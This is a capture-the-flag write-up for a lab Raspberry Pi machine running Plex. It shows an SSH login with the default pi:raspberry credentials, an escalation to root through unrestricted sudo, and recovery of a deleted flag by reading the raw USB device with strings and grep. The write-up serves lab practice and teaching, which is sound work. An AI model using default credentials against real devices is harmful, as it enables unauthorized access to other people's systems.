Accesing to http://10.10.10.48/admin we found that we are facing a Raspberry Pi device which host a Plex server. Trying the default credentials through SSH (pi:raspberry) we have access.

And checking the sudoers we have root access

```bash
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~ $ sudo su
root@raspberrypi:/home/pi# whoami
root
```

To retrieve the root flag we found the following message

```bash
root@raspberrypi:/home/pi# cat /root/root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...

root@raspberrypi:/home/pi# ls /media/usbstick/
damnit.txt  lost+found

root@raspberrypi:/home/pi# cat /media/usbstick/damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

So lets try to read the raw memory

```bash
root@raspberrypi:/media/usbstick# mount
[...SNIP...]
/dev/sdb on /media/usbstick type ext4 

root@raspberrypi:/media/usbstick# cat /dev/sdb

(Z"�      sx>esx>e��S��1�Y
                          �<Byc[��B)�>r &�</media/usbstick�yZ�.Gu���m^��>
                                                                         �1�Y
�|*,.�▒���}+-��Ո         
 
  
           ▒  ▒       ! " # $ % & ' ( ) ������������������������������������������������������������������������������������������������������������������������������������������������������������������[...SNIP...]
```

As we know that the flag is a 32 string character, we can filter by the following code

```bash
root@raspberrypi:/media/usbstick# strings /dev/sdb -n 32
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
```

And we have it. We could have use grep and regex too

```bash
root@raspberrypi:# grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
3d3e483143ff12ec505d026fa13e020b
```